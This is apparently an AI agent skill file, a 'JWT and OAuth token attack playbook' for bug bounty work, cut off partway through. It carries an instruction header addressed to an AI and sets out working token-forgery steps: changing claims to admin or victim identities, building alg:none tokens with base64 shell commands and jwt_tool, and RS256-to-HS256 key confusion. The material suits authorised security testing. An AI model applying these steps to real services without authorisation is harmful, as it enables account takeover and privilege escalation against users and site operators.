---
name: jwt-oauth-token-attacks
description: JWT and OAuth token attack playbook. Use when validating token trust, signing algorithms, key handling, claim abuse, bearer flows, and OAuth account-binding weaknesses.
scope: web2
---
JWT and OAuth token attack playbook. Use when validating token trust, signing algorithms, key handling, claim abuse, bearer flows, and OAuth account-binding weaknesses.

# SKILL: JWT and OAuth 2.0 Token Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert authentication token attacks. Covers JWT cryptographic attacks (alg:none, RS256→HS256, secret crack, kid/jku injection), OAuth flow attacks (CSRF, open redirect, token theft, implicit flow abuse), PKCE bypass, and token leakage via Referer/logs. This is critical for modern web applications.


## 1. JWT ANATOMY

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────────────┘ └────────────────────────────┘ └──────────────────────────────────────────┘
         HEADER                     PAYLOAD                           SIGNATURE

**Decode in terminal**:
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
# → {"userId":1234,"role":"user"}

**Common claim targets** (modify to escalate):
{
  "role": "admin",
  "isAdmin": true,
  "userId": OTHER_USER_ID,
  "email": "victim@target.com",
  "sub": "admin",
  "permissions": ["admin", "write", "delete"],
  "tier": "premium"
}

---

## 2. ATTACK 1 — ALGORITHM NONE (alg:none)

Server doesn't validate signature when algorithm is "none"/"None"/"NONE":

# Burp JWT Editor / python-jwt attack:
# Step 1: Decode header
echo '{"alg":"HS256","typ":"JWT"}' | base64 → old_header

# Step 2: Create new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 3: Modify payload (e.g., role → admin):
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 4: Construct token with empty signature:
HEADER.PAYLOAD.
# OR:
HEADER.PAYLOAD

**Tool (jwt_tool)**:
python3 jwt_tool.py JWT_TOKEN -X a
# → automatically generates alg:none variants

---

## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION

**When server uses RS256** (asymmetric — RSA private key signs, public key verifies):
- Server's public key is often discoverable (JWKS endpoint, /certs, source code)
- Attack: tell server "this is HS256" → server verifies HS256 HMAC using **the public key as secret**

# Step 1: Obtain public key (PEM format)
# From: /api/.well-known/jwks.json → convert to PEM
# From: /certs endpoint
# From: OpenSSL extraction from HTTPS cert

# Step 2: Use jwt_tool to sig
...

## References
- Source: https://github.com/yaklang/hack-skills/blob/main/skills/jwt-oauth-token-attacks/SKILL.md
- License: MIT — Copyright (c) 2026 VillanCh
- Distilled for bbhunter by scripts/import_hack_skills.py
